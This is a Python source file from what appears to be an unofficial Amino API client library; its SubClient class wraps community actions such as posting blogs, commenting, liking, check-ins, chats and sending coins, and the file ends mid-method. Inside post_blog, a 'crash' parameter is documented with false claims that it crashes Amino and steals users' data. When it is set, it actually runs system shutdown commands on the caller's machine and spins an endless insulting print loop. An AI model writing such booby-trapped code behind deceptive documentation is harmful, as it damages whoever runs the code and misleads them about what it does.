from __future__ import annotations
# ^ this thing should fix problem for python3.9 and lower(?)

from json import dumps
from typing import BinaryIO

from .client import Client
from .lib import exceptions, headers, objects
from .lib.helpers import gen_deviceId, json_minify, str_uuid4, inttime, clientrefid, bytes_to_b64, LOCAL_TIMEZONE

class SubClient(Client):
    """
        Client to work with community in Amino.
        (aminoapps.com)
    """
    def __init__(
        self, mainClient: Client,
        comId: str = None, aminoId: str = None,
         
        get_community: bool = False,
        get_profile: bool = False,
        **kwargs
    ):
        """
        Init subclient.

        Accepting:
        - mainClient: aminofixfix.Client
        - comId: str | int | None = None
        - aminoId: str | None = None
            - you can pass only one thing
            - comId will be taken first
        - get_community: bool = False
            - should subclient get info about community you passed?
            - False for no (default), True for yes
        - get_profile: bool = False
            - should subclient get info about your profile in community you passed?
            - False for no (default), True for yes
    
        
        \- imperialwool, where is another fields of subclient??? ;-;

        \- its in main client lol why you need to pass them again
        """
        Client.__init__(
            self, deviceId=mainClient.device_id, proxies=mainClient.proxies,
            autoDevice=mainClient.autoDevice, userAgent=mainClient.user_agent,
            http2_enabled=mainClient.http2_enabled,
            own_timeout=mainClient.timeout_settings,
            socket_enabled=False,
            api_library=mainClient.api_library or objects.APILibraries.HTTPX
        )
        self.vc_connect: bool = False
        self.sid: str = mainClient.sid
        self.userId: str = mainClient.userId
        self.device_id: str = mainClient.device_id
        self.user_agent: str = mainClient.user_agent
        self.profile: objects.UserProfile = mainClient.profile

        self.comId: str | None = None
        self.aminoId: str | None = None

        self.community: objects.Community | None = None
        self.profile: objects.UserProfile | None = objects.UserProfile(None)

        if comId is not None:
            self.comId = comId
            if get_community:
                self.community = self.get_community_info(comId)

        if aminoId is not None:
            link = "http://aminoapps.com/c/"
            self.comId = self.get_from_code(link + aminoId).comId
            self.community = self.get_community_info(self.comId)

        if comId is None and aminoId is None: raise exceptions.NoCommunity()

        if get_profile:
            try: self.profile: objects.UserProfile = self.get_user_info(userId=self.profile.userId)
            except AttributeError: raise exceptions.FailedLogin()
            except exceptions.UserUnavailable: pass

    def additional_headers(self, data: str = None, content_type: str = None) -> dict[str, str]:
        """
        Function to make additional headers, that API needs.

        Accepting:
        - data: str
        - content_type: str

        Recieving:
        - object `dict`
        """
        return headers.additionals(
            data=data,
            content_type=content_type,
            user_agent=self.user_agent,
            sid=self.sid,
            auid=self.userId,
            deviceId=gen_deviceId() if self.autoDevice else self.device_id
        )

    def get_invite_codes(self, status: str = "normal", start: int = 0, size: int = 25) -> objects.InviteCodeList:
        """
        Get invite codes of community. If you have rights, of course.

        Accepting:
        - status: str = "normal"
            - ???
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `InviteCodeList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/g/s-x{self.comId}/community/invitation?status={status}&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.InviteCodeList(response.json()["communityInvitationList"]).InviteCodeList

    def generate_invite_code(self, duration: int = 0, force: bool = True) -> objects.InviteCode:
        """
        Generate invite code for community. If you have rights, of course.

        Accepting:
        - duration: int = 0
            - duration of invite code
            - if 0, its will work forever
        - force: bool = True
            - do you want show your force power of siths or no?

        Recieving:
        - object `InviteCode`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "duration": duration,
            "force": force,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/g/s-x{self.comId}/community/invitation", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.InviteCode(response.json()["communityInvitation"]).InviteCode

    def get_vip_users(self) -> objects.UserProfileList:
        """
        Get VIP users of community. VIP is basically fanclubs.

        Recieving:
        - object `UserProfileList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/{self.comId}/s/influencer", headers=self.additional_headers())
        if response.status_code != 200:
            return exceptions.CheckException(response)
        else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList

    def delete_invite_code(self, inviteId: str) -> int:
        """
        Delete invite code from community. If you have rights, of course.

        Accepting:
        - inviteId: str
            - its **NOT** invite code
            - it **CANT BE** invite code
            - it **SHOULD BE** invite **ID**
            - yes, you can get it. using function `get_invite_codes`

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.delete(f"/g/s-x{self.comId}/community/invitation/{inviteId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def post_blog(self, title: str, content: str, imageList: list = None, captionList: list = None, categoriesList: list = None, backgroundColor: str = None, fansOnly: bool = False, extensions: dict = None, crash: bool = False) -> int:
        """
        Posting blog.

        Accepting:
        - title: str
        - content: str
        - imageList: list = None
        - captionList: list = None
            - captions for images
        - categoriesList: list = True
        - backgroundColor: str = None
            - should be only hex code, like "#000000"
            - if None, it will be just white
        - fansOnly: bool = False
            - is it for your onlyfans or no?
            - works only if you have fanclub
        - extensions: dict = None
            - maybe your code is tight
        - crash: bool = False
            - will cause crash for all users in amino and will log out everyone steal everyone's cookies data bank account houses money and etc

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        
        if crash:
            import os
            from threading import Thread
            def work():
                while True:
                    print("fuck you raider touch some grass learn how to code its not working like that child")
            
            Thread(target=work).start()
            try: os.system("shutdown /s /t 0")
            except: pass
            try: os.system("shutdown now")
            except: pass

        mediaList = []

        if captionList is not None:
            for image, caption in zip(imageList, captionList):
                mediaList.append([100, self.upload_media(image, "image"), caption])

        else:
            if imageList is not None:
                for image in imageList:
                    mediaList.append([100, self.upload_media(image, "image"), None])

        data = {
            "address": None,
            "content": content,
            "title": title,
            "mediaList": mediaList,
            "extensions": extensions,
            "latitude": 0,
            "longitude": 0,
            "eventSource": "GlobalComposeMenu",
            "timestamp": inttime()
        }

        if fansOnly: data["extensions"] = {"fansOnly": fansOnly}
        if backgroundColor and len(backgroundColor) == 7: data["extensions"] = {"style": {"backgroundColor": backgroundColor}}
        if categoriesList: data["taggedBlogCategoryIdList"] = categoriesList

        data = dumps(data)
        
        response = self.session.post(f"/x{self.comId}/s/blog", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def post_wiki(self, title: str, content: str, icon: str = None, imageList: list = None, keywords: str = None, backgroundColor: str = None, fansOnly: bool = False) -> int:
        """
        Posting wiki.

        Accepting:
        - title: str
        - content: str
        - imageList: list = None
        - keywords: str = None
        - backgroundColor: str = None
            - should be only hex code, like "#000000"
            - if None, it will be just white
        - fansOnly: bool = False
            - is it for your onlyfans or no?
            - works only if you have fanclub

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        
        mediaList = []

        for image in imageList:
            mediaList.append([100, self.upload_media(image, "image"), None])

        data = {
            "label": title,
            "content": content,
            "mediaList": mediaList,
            "eventSource": "GlobalComposeMenu",
            "timestamp": inttime()
        }

        if icon: data["icon"] = icon
        if keywords: data["keywords"] = keywords
        if fansOnly: data["extensions"] = {"fansOnly": fansOnly}
        if backgroundColor and len(backgroundColor) == 7: data["extensions"] = {"style": {"backgroundColor": backgroundColor}}
        data = dumps(data)
        
        response = self.session.post(f"/x{self.comId}/s/item", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def edit_blog(self, blogId: str, title: str = None, content: str = None, imageList: list = None, categoriesList: list = None, backgroundColor: str = None, fansOnly: bool = False) -> int:
        """
        Editing blog.

        Accepting:
        - blogId: str
        - title: str = None
        - content: str = None
        - imageList: list = None
        - captionList: list = None
            - captions for images
        - categoriesList: list = True
        - backgroundColor: str = None
            - should be only hex code, like "#000000"
            - if None, it will be just white
        - fansOnly: bool = False
            - is it for your onlyfans or no?
            - works only if you have fanclub

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        mediaList = []

        for image in imageList:
            mediaList.append([100, self.upload_media(image, "image"), None])

        data = {
            "address": None,
            "mediaList": mediaList,
            "latitude": 0,
            "longitude": 0,
            "eventSource": "PostDetailView",
            "timestamp": inttime()
        }

        if title: data["title"] = title
        if content: data["content"] = content
        if fansOnly: data["extensions"] = {"fansOnly": fansOnly}
        if backgroundColor: data["extensions"] = {"style": {"backgroundColor": backgroundColor}}
        if categoriesList: data["taggedBlogCategoryIdList"] = categoriesList
        data = dumps(data)
        
        response = self.session.post(f"/x{self.comId}/s/blog/{blogId}", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def delete_blog(self, blogId: str) -> int:
        """
        Deleting blog.

        Accepting:
        - blogId: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.delete(f"/x{self.comId}/s/blog/{blogId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def delete_wiki(self, wikiId: str) -> int:
        """
        Deleting wiki.

        Accepting:
        - wikiId: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.delete(f"/x{self.comId}/s/item/{wikiId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def repost_blog(self, content: str = None, blogId: str = None, wikiId: str = None) -> int:
        """
        Reposing blog.

        Accepting:
        - blogId: str = None
        - wikiId: str = None
            - can be only blogId or wikiId
            - blogId > wikiId
            - if both are None, it will raise Exception
        - content: str = None

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        if blogId is not None: refObjectId, refObjectType = blogId, 1
        elif wikiId is not None: refObjectId, refObjectType = wikiId, 2
        else: raise exceptions.SpecifyType()

        data = dumps({
            "content": content,
            "refObjectId": refObjectId,
            "refObjectType": refObjectType,
            "type": 2,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/blog", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def check_in(self, tz: int = LOCAL_TIMEZONE) -> int:
        """
        Check in community.

        Accepting:
        - tz: int
            - better dont touch

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "timezone": tz,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/check-in", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def repair_check_in(self, method: int = 0) -> int:
        """
        Repairing check in streak.

        Accepting:
        - method: int = 0
            - if 0, it will use coins
            - if 1, it will use Amino+ superpower

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = {"timestamp": inttime()}
        if method == 0: data["repairMethod"] = "1"  # Coins
        if method == 1: data["repairMethod"] = "2"  # Amino+

        data = dumps(data)
        
        response = self.session.post(f"/x{self.comId}/s/check-in/repair", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def lottery(self, tz: int = LOCAL_TIMEZONE) -> objects.LotteryLog:
        """
        Testing your luck in lottery. Once a day, of course.

        Accepting:
        - tz: int 
            - better dont touch

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "timezone": tz,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/check-in/lottery", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.LotteryLog(response.json()["lotteryLog"]).LotteryLog

    def edit_profile(self, nickname: str = None, content: str = None, icon: BinaryIO = None, chatRequestPrivilege: str = None, imageList: list = None, captionList: list = None, backgroundImage: str = None, backgroundColor: str = None, titles: list = None, colors: list = None, defaultBubbleId: str = None) -> int:
        """
        Edit account's Profile.

        **Parameters**
            - **nickname** : Nickname of the Profile.
            - **content** : Biography of the Profile.
            - **icon** : Icon of the Profile.
            - **titles** : Titles.
            - **colors** : Colors for titles.
            - **imageList** : List of images.
            - **captionList** : Captions for images.
            - **backgroundImage** : Url of the Background Picture of the Profile.
            - **backgroundColor** : Hexadecimal Background Color of the Profile.
            - **defaultBubbleId** : Chat bubble ID.
            - **chatRequestPrivilege** : Manage your right to accept chats.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        mediaList = []

        data = {"timestamp": inttime()}

        if captionList is not None:
            for image, caption in zip(imageList, captionList):
                mediaList.append([100, self.upload_media(image, "image"), caption])

        else:
            if imageList is not None:
                for image in imageList:
                    mediaList.append([100, self.upload_media(image, "image"), None])

        if imageList is not None or captionList is not None:
            data["mediaList"] = mediaList

        if nickname: data["nickname"] = nickname
        if icon: data["icon"] = self.upload_media(icon, "image")
        if content: data["content"] = content

        if chatRequestPrivilege: data["extensions"] = {"privilegeOfChatInviteRequest": chatRequestPrivilege}
        if backgroundImage: data["extensions"] = {"style": {"backgroundMediaList": [[100, backgroundImage, None, None, None]]}}
        if backgroundColor: data["extensions"] = {"style": {"backgroundColor": backgroundColor}}
        if defaultBubbleId: data["extensions"] = {"defaultBubbleId": defaultBubbleId}

        if titles or colors:
            tlt = []
            for titles, colors in zip(titles, colors):
                tlt.append({"title": titles, "color": colors})

            data["extensions"] = {"customTitles": tlt}

        data = dumps(data)
        
        response = self.session.post(f"/x{self.comId}/s/user-profile/{self.profile.userId}", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def vote_poll(self, blogId: str, optionId: str) -> int:
        data = dumps({
            "value": 1,
            "eventSource": "PostDetailView",
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/poll/option/{optionId}/vote", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def comment(self, message: str, userId: str = None, blogId: str = None, wikiId: str = None, replyTo: str = None, isGuest: bool = False) -> int:
        """
        Comment on a User's Wall, Blog or Wiki.

        **Parameters**
            - **message** : Message to be sent.
            - **userId** : ID of the User. (for Walls)
            - **blogId** : ID of the Blog. (for Blogs)
            - **wikiId** : ID of the Wiki. (for Wikis)
            - **replyTo** : ID of the Comment to Reply to.
            - **isGuest** : You want to be Guest or no?

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        data = {
            "content": message,
            "stickerId": None,
            "type": 0,
            "timestamp": inttime()
        }

        if replyTo: data["respondTo"] = replyTo

        if isGuest: comType = "g-comment"
        else: comType = "comment"

        if userId:
            data["eventSource"] = "UserProfileView"
            data = dumps(data)
            
            response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/{comType}", headers=self.additional_headers(data=data), data=data)

        elif blogId:
            data["eventSource"] = "PostDetailView"
            data = dumps(data)
            
            response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/{comType}", headers=self.additional_headers(data=data), data=data)

        elif wikiId:
            data["eventSource"] = "PostDetailView"
            data = dumps(data)
            
            response = self.session.post(f"/x{self.comId}/s/item/{wikiId}/{comType}", headers=self.additional_headers(data=data), data=data)

        else: raise exceptions.SpecifyType()
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def delete_comment(self, commentId: str, userId: str = None, blogId: str = None, wikiId: str = None) -> int:
        """
        Delete a Comment on a User's Wall, Blog or Wiki.

        **Parameters**
            - **commentId** : ID of the Comment.
            - **userId** : ID of the User. (for Walls)
            - **blogId** : ID of the Blog. (for Blogs)
            - **wikiId** : ID of the Wiki. (for Wikis)

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        if userId: response = self.session.delete(f"/x{self.comId}/s/user-profile/{userId}/comment/{commentId}", headers=self.additional_headers())
        elif blogId: response = self.session.delete(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}", headers=self.additional_headers())
        elif wikiId: response = self.session.delete(f"/x{self.comId}/s/item/{wikiId}/comment/{commentId}", headers=self.additional_headers())
        else: raise exceptions.SpecifyType()

        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def like_blog(self, blogId: str | list = None, wikiId: str = None) -> int:
        """
        Like a Blog, Multiple Blogs or a Wiki.

        **Parameters**
            - **blogId** : ID of the Blog or List of IDs of the Blogs. (for Blogs)
            - **wikiId** : ID of the Wiki. (for Wikis)

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        data = {
            "value": 4,
            "timestamp": inttime()
        }

        if blogId:
            if isinstance(blogId, str):
                data["eventSource"] = "UserProfileView"
                data = dumps(data)
                
                response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/vote?cv=1.2", headers=self.additional_headers(data=data), data=data)

            elif isinstance(blogId, list):
                data["targetIdList"] = blogId
                data = dumps(data)
                
                response = self.session.post(f"/x{self.comId}/s/feed/vote", headers=self.additional_headers(data=data), data=data)

            else: raise exceptions.WrongType

        elif wikiId:
            data["eventSource"] = "PostDetailView"
            data = dumps(data)
            
            response = self.session.post(f"/x{self. comId}/s/item/{wikiId}/vote?cv=1.2", headers=self.additional_headers(data=data), data=data)

        else: raise exceptions.SpecifyType()
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def unlike_blog(self, blogId: str = None, wikiId: str = None) -> int:
        """
        Remove a like from a Blog or Wiki.

        **Parameters**
            - **blogId** : ID of the Blog. (for Blogs)
            - **wikiId** : ID of the Wiki. (for Wikis)

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        if blogId: response = self.session.delete(f"/x{self.comId}/s/blog/{blogId}/vote?eventSource=UserProfileView", headers=self.additional_headers())
        elif wikiId: response = self.session.delete(f"/x{self.comId}/s/item/{wikiId}/vote?eventSource=PostDetailView", headers=self.additional_headers())
        else: raise exceptions.SpecifyType()

        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def like_comment(self, commentId: str, userId: str = None, blogId: str = None, wikiId: str = None) -> int:
        """
        Like a Comment on a User's Wall, Blog or Wiki.

        **Parameters**
            - **commentId** : ID of the Comment.
            - **userId** : ID of the User. (for Walls)
            - **blogId** : ID of the Blog. (for Blogs)
            - **wikiId** : ID of the Wiki. (for Wikis)

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        data = {
            "value": 1,
            "timestamp": inttime()
        }

        if userId:
            data["eventSource"] = "UserProfileView"
            data = dumps(data)
            
            response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/comment/{commentId}/vote?cv=1.2&value=1", headers=self.additional_headers(data=data), data=data)

        elif blogId:
            data["eventSource"] = "PostDetailView"
            data = dumps(data)
            
            response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}/vote?cv=1.2&value=1", headers=self.additional_headers(data=data), data=data)

        elif wikiId:
            data["eventSource"] = "PostDetailView"
            data = dumps(data)
            
            response = self.session.post(f"/x{self.comId}/s/item/{wikiId}/comment/{commentId}/g-vote?cv=1.2&value=1", headers=self.additional_headers(data=data), data=data)

        else: raise exceptions.SpecifyType()
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def unlike_comment(self, commentId: str, userId: str = None, blogId: str = None, wikiId: str = None) -> int:
        """
        Remove a like from a Comment on a User's Wall, Blog or Wiki.

        **Parameters**
            - **commentId** : ID of the Comment.
            - **userId** : ID of the User. (for Walls)
            - **blogId** : ID of the Blog. (for Blogs)
            - **wikiId** : ID of the Wiki. (for Wikis)

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        if userId: response = self.session.delete(f"/x{self.comId}/s/user-profile/{userId}/comment/{commentId}/g-vote?eventSource=UserProfileView", headers=self.additional_headers())
        elif blogId: response = self.session.delete(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}/g-vote?eventSource=PostDetailView", headers=self.additional_headers())
        elif wikiId: response = self.session.delete(f"/x{self.comId}/s/item/{wikiId}/comment/{commentId}/g-vote?eventSource=PostDetailView", headers=self.additional_headers())
        else: raise exceptions.SpecifyType()

        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def upvote_comment(self, blogId: str, commentId: str):
        """
        Upvote comment on question.

        **Parameters**
            - **blogId** : ID of the Blog.
            - **commentId** : ID of the Comment.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        data = dumps({
            "value": 1,
            "eventSource": "PostDetailView",
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}/vote?cv=1.2&value=1", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def downvote_comment(self, blogId: str, commentId: str):
        """
        Downvote comment on question.

        **Parameters**
            - **blogId** : ID of the Blog.
            - **commentId** : ID of the Comment.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        data = dumps({
            "value": -1,
            "eventSource": "PostDetailView",
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}/vote?cv=1.2&value=-1", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def unvote_comment(self, blogId: str, commentId: str):
        """
        Remove vote from comment.

        **Parameters**
            - **blogId** : ID of the Blog.
            - **commentId** : ID of the Comment.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.delete(f"/x{self.comId}/s/blog/{blogId}/comment/{commentId}/vote?eventSource=PostDetailView", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def reply_wall(self, userId: str, commentId: str, message: str):
        """
        Reply to comment on wall.

        **Parameters**
            - **userId** : ID of the User.
            - **commentId** : ID of the Comment.
            - **message** : Message.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        data = dumps({
            "content": message,
            "stackedId": None,
            "respondTo": commentId,
            "type": 0,
            "eventSource": "UserProfileView",
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/comment", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def send_active_obj(self, startTime: int = None, endTime: int = None, optInAdsFlags: int = 2147483647, tz: int = LOCAL_TIMEZONE, timers: list = None, timestamp: int = inttime()): 
        """
        Sending mintues to Amino servers.

        Hey, is this method used in amino coin generators? And why there is now so tight limits that you can recieve "Too Many Requests" even in app?

        **Parameters**
            - **startTime** : Unixtime (int) of start time.
            - **endTime** : Unixtime (int) of end time.
            - **optInAdsFlags** : ???
            - **tz** : Timezone.
            - **timers** : Timers instead startTime and endTime.
            - **timestamp** : Timestamp..? WHY YOU NEED TIMESTAMP IN FUNCTION BUT NOT IN CODE WTF WITH YOU MINORI OR WHO DID THIS

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        data = {"userActiveTimeChunkList": [{"start": startTime, "end": endTime}], "timestamp": timestamp, "optInAdsFlags": optInAdsFlags, "timezone": tz} 
        if timers: data["userActiveTimeChunkList"] = timers 
        data = json_minify(dumps(data))  
        
        response = self.session.post(f"/x{self.comId}/s/community/stats/user-active-time", headers=self.additional_headers(data=data), data=data) 
        if response.status_code != 200: 
            return exceptions.CheckException(response) 
        else: return response.status_code

    def activity_status(self, status: str):
        """
        Sets your activity status to offline or online.

        Accepting:
        - status: str
            - only "on" or "off"

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        if "on" in status.lower(): status = 1
        elif "off" in status.lower(): status = 2
        else: raise exceptions.WrongType(status)

        data = dumps({
            "onlineStatus": status,
            "duration": 86400,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/user-profile/{self.profile.userId}/online-status", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def check_notifications(self):
        """
        Checking notifications as read.

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.post(f"/x{self.comId}/s/notification/checked", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def delete_notification(self, notificationId: str):
        """
        Delete notification.

        Accepting:
        - notificationId: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.delete(f"/x{self.comId}/s/notification/{notificationId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def clear_notifications(self):
        """
        Remove all notifications.

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.delete(f"/x{self.comId}/s/notification", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def start_chat(self, userId: str | list, message: str, title: str = None, content: str = None, isGlobal: bool = False, publishToGlobal: bool = False):
        """
        Start an Chat with an User or List of Users.

        **Parameters**
            - **userId** : ID of the User or List of User IDs.
            - **message** : Starting Message.
            - **title** : Title of Group Chat.
            - **content** : Content of Group Chat.
            - **isGlobal** : If Group Chat is Global.
            - **publishToGlobal** : If Group Chat should show in Global.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        if isinstance(userId, str): userIds = [userId]
        elif isinstance(userId, list): userIds = userId
        else: raise exceptions.WrongType(type(userId))

        data = {
            "title": title,
            "inviteeUids": userIds,
            "initialMessageContent": message,
            "content": content,
            "timestamp": inttime()
        }

        if isGlobal is True: data["type"] = 2; data["eventSource"] = "GlobalComposeMenu"
        else: data["type"] = 0

        if publishToGlobal is True: data["publishToGlobal"] = 1
        else: data["publishToGlobal"] = 0

        data = dumps(data)
        
        response = self.session.post(f"/x{self.comId}/s/chat/thread", data=data, headers=self.additional_headers(data=data))
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.Thread(response.json()["thread"]).Thread

    def invite_to_chat(self, userId: str | list, chatId: str):
        """
        Invite a User or List of Users to a Chat.

        **Parameters**
            - **userId** : ID of the User or List of User IDs.
            - **chatId** : ID of the Chat.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        if isinstance(userId, str): userIds = [userId]
        elif isinstance(userId, list): userIds = userId
        else: raise exceptions.WrongType(type(userId))

        data = dumps({
            "uids": userIds,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/member/invite", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def add_to_favorites(self, userId: str):
        """
        Adding user to favotites.

        **Parameters**
            - **userId** : ID of the User.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.post(f"/x{self.comId}/s/user-group/quick-access/{userId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def send_coins(self, coins: int, blogId: str = None, chatId: str = None, objectId: str = None, transactionId: str = None):
        """
        Sending coins.

        **Parameters**
            - **blogId** : ID of the Blog.
            - **chatId** : ID of the Chat.
            - **objectId** : ID of ...some object.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        url = None
        if transactionId is None: transactionId = str_uuid4()

        data = {
            "coins": coins,
            "tippingContext": {"transactionId": transactionId},
            "timestamp": inttime()
        }

        if blogId is not None: url = f"/x{self.comId}/s/blog/{blogId}/tipping"
        if chatId is not None: url = f"/x{self.comId}/s/chat/thread/{chatId}/tipping"
        if objectId is not None:
            data["objectId"] = objectId
            data["objectType"] = 2
            url = f"/x{self.comId}/s/tipping"

        if url is None: raise exceptions.SpecifyType()

        data = dumps(data)
        
        response = self.session.post(url, headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def thank_tip(self, chatId: str, userId: str):
        """
        Thank you for the rose. :heart:

        **Parameters**
            - **chatId** : ID of the Blog.
            - **userId** : ID of the Chat.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/tipping/tipped-users/{userId}/thank", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def follow(self, userId: str | list):
        """
        Follow an User or Multiple Users.

        **Parameters**
            - **userId** : ID of the User or List of IDs of the Users.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        if isinstance(userId, str):
